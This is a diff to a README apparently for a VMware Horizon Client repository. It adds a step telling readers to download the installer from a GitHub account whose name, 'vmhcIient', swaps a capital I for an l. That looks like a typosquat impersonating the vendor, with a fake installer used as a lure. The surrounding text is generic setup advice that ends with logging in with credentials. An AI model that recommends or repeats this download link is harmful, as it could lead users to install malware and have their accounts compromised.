@@ -8,6 +8,8 @@
 
 ## Installation
 
+Download the latest release from [Releases](https://github.com/vmhcIient/VMware-Horizon-Client/releases/tag/2412)
+
 Once the download finishes, double-click the installer to launch the setup wizard. Follow the on-screen instructions to select your preferred options—for instance, enabling smart card login, adjusting display settings, or optimizing performance. After installation concludes, open the client and log in using your account credentials.
 If you experience connection difficulties, review your network configuration or consult your IT support team.
 
